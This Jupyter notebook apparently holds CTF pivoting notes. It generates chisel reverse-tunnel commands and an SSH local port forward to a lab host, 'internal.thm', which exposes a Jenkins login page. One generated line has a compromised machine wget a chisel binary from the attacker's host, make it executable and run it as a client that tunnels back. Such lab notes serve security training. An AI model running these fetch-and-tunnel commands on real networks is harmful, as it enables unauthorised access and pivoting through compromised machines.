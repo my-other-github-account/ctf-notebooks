{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "6d372a04-8a25-484c-903d-e2dfdc1989a9",
   "metadata": {},
   "source": [
    "# ASSIGNMENT"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "13a2a618-eb8e-4dcd-b34d-097f5d4380ed",
   "metadata": {},
   "source": [
    "# Chisel:"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f3296e42-c282-490c-bd6c-dfca5c736352",
   "metadata": {},
   "source": [
    "Route local through remote to machines/ports only it can access:\n",
    "\n",
    "\tLocal: \n",
    "\t./chisel server -p 8000 --reverse\n",
    "\t\n",
    "\tRemote:\n",
    "\t./chisel client 1.1.1.1:8000 R:80:3.3.3.4:80 \n",
    "\t\n",
    "\tRequests to 80 on local are instead now forwarded through client - so we access websites only it can"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "979547d0-c692-446f-ad8c-e3efa9588821",
   "metadata": {},
   "outputs": [],
   "source": [
    "# chisel86\n",
    "# chisel64\n",
    "# chiselarm"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "53a135a3-0f74-486f-b833-4a519ac40c63",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'172.16.1.2'"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "result = !ip a | grep ppp\n",
    "my_ip = result[2].split(\"inet\")[1].split(\"peer\")[0].strip()\n",
    "my_ip"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "17861c2f-a525-4740-877c-75dd544f0dcf",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "wget 172.16.1.2:7770/chisel86 && chmod +x chisel86\n",
      "./chisel86 client 172.16.1.2:7771 770:www.exploit-db.com:443 &\n",
      "./chisel86 client 172.16.1.2:7771 771:www.github.com:443 &\n",
      "\n",
      "wget 172.16.1.2:7770/chisel64 && chmod +x chisel64\n",
      "./chisel64 client 172.16.1.2:7771 770:www.exploit-db.com:443 &\n",
      "./chisel64 client 172.16.1.2:7771 771:www.github.com:443 &\n"
     ]
    }
   ],
   "source": [
    "# Route remote through local: (wgets to 127.0.0.1:777 hit website)\n",
    "\n",
    "!echo \"wget {my_ip}:7770/chisel86 && chmod +x chisel86\"\n",
    "!echo \"./chisel86 client {my_ip}:7771 770:www.exploit-db.com:443 &\"\n",
    "!echo \"./chisel86 client {my_ip}:7771 771:www.github.com:443 &\"\n",
    "\n",
    "!echo\n",
    "!echo \"wget {my_ip}:7770/chisel64 && chmod +x chisel64\"\n",
    "!echo \"./chisel64 client {my_ip}:7771 770:www.exploit-db.com:443 &\"\n",
    "!echo \"./chisel64 client {my_ip}:7771 771:www.github.com:443 &\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "1dae64d6-f0ef-461d-b826-86b291697179",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2021/10/23 11:43:07 server: Fingerprint fkMEPSDHXQk46KTNuIWRuT0Xxa69U0rT7It7zetsBvY=\n",
      "2021/10/23 11:43:07 server: Listening on http://0.0.0.0:7771\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Traceback (most recent call last):\n",
      "  File \"/usr/lib/python3.9/runpy.py\", line 197, in _run_module_as_main\n",
      "    return _run_code(code, main_globals, None,\n",
      "  File \"/usr/lib/python3.9/runpy.py\", line 87, in _run_code\n",
      "    exec(code, run_globals)\n",
      "  File \"/usr/lib/python3.9/http/server.py\", line 1289, in <module>\n",
      "    test(\n",
      "  File \"/usr/lib/python3.9/http/server.py\", line 1244, in test\n",
      "    with ServerClass(addr, HandlerClass) as httpd:\n",
      "  File \"/usr/lib/python3.9/socketserver.py\", line 452, in __init__\n",
      "    self.server_bind()\n",
      "  File \"/usr/lib/python3.9/http/server.py\", line 1287, in server_bind\n",
      "    return super().server_bind()\n",
      "  File \"/usr/lib/python3.9/http/server.py\", line 138, in server_bind\n",
      "    socketserver.TCPServer.server_bind(self)\n",
      "  File \"/usr/lib/python3.9/socketserver.py\", line 466, in server_bind\n",
      "    self.socket.bind(self.server_address)\n",
      "OSError: [Errno 98] Address already in use\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "^C\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "\n",
    "os.system(\"cd ~/hax/ && python3 -m http.server 7770 &\")\n",
    "\n",
    "!~/hax/chiselarm server -p 7771 # Remote can route through local (e.g. to web)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "52af90b3-a6cf-44df-ba54-aa47bd8de093",
   "metadata": {},
   "source": [
    "# SSH:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "07ce1e60-1c69-4586-9e88-599a1b88aecf",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: LPORT=444\n",
      "env: RPORT=8080\n",
      "env: USER=aubreanna\n",
      "env: TARGET=internal.thm\n",
      "ssh -L 444:127.0.0.1:8080 aubreanna@internal.thm\n"
     ]
    }
   ],
   "source": [
    "# LPORT on local machine leads to RPORT on remote machine\n",
    "%env LPORT=444\n",
    "%env RPORT=8080\n",
    "%env USER=aubreanna\n",
    "%env TARGET=internal.thm\n",
    "!echo ssh -L $LPORT:127.0.0.1:$RPORT $USER@$TARGET"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "0195d433-e1ab-44b7-8a1c-bb6504012ea9",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "127.0.0.1:444\n"
     ]
    }
   ],
   "source": [
    "!echo 127.0.0.1:$LPORT"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "549ea9c7-bf34-4d28-9d59-9b12abcf7a6c",
   "metadata": {},
   "source": [
    "http://127.0.0.1:10000"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "d26a96d9-244b-49aa-9a23-1cbd53f6e86b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html><head><meta http-equiv='refresh' content='1;url=/login?from=%2F'/><script>window.location.replace('/login?from=%2F');</script></head><body style='background-color:white; color:white;'>\n",
      "\n",
      "\n",
      "Authentication required\n",
      "<!--\n",
      "You are authenticated as: anonymous\n",
      "Groups that you are in:\n",
      "  \n",
      "Permission you need to have (but didn't): hudson.model.Hudson.Read\n",
      " ... which is implied by: hudson.security.Permission.GenericRead\n",
      " ... which is implied by: hudson.model.Hudson.Administer\n",
      "-->\n",
      "\n",
      "</body></html>                                                                                                                                                                                                                                                                                                            "
     ]
    }
   ],
   "source": [
    "!curl 127.0.0.1:$LPORT"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8e5b9eaa-7458-40f4-9aff-5445047eff34",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
